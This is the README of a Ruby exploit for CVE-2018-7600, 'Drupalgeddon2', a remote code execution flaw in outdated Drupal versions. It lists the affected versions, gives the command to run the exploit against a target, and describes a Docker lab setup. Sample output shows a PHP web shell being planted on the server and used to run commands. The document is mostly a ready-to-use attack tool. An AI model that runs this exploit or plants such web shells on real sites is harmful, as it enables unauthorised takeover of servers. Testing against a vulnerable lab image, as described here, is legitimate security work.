# CVE-2018-7600 | Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.


**Vulnerable versions:**
- < 7.58
- 8.x < 8.3.9
- 8.4.x < 8.4.6
- 8.5.x < 8.5.1

# Usage

**Exploit**
```
ruby cve-2018-7600_exploit.rb <TARGET>
```

## PoC
To test it, you can use a vulnerable docker image

```
docker pull drupal:8.5.0-apache
docker run -i -t --name drupalgeddon2 drupal:8.5.0-apache 
docker inspect drupalgeddon2 | grep IPAddress
```
Note: to make drupal installation easier, user SQLite database



```
-> ruby cve-2018-7600_exploit.rb 172.17.0.2 
[*] --==[::#Drupalggedon2::]==--

[+] Target seems to be exploitable! w00hooOO!
[+] PHP shell: http://172.17.0.2/s.php?c=CMD 
[+] Type your commands (exit to exit) and press Enter!
Drupalgeddon2-> whoami
www-data
Drupalgeddon2-> pwd
/var/www/html
Drupalgeddon2-> 
```


# References
- http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
- https://research.checkpoint.com/uncovering-drupalgeddon-2/
- https://github.com/dreadlocked/Drupalgeddon2

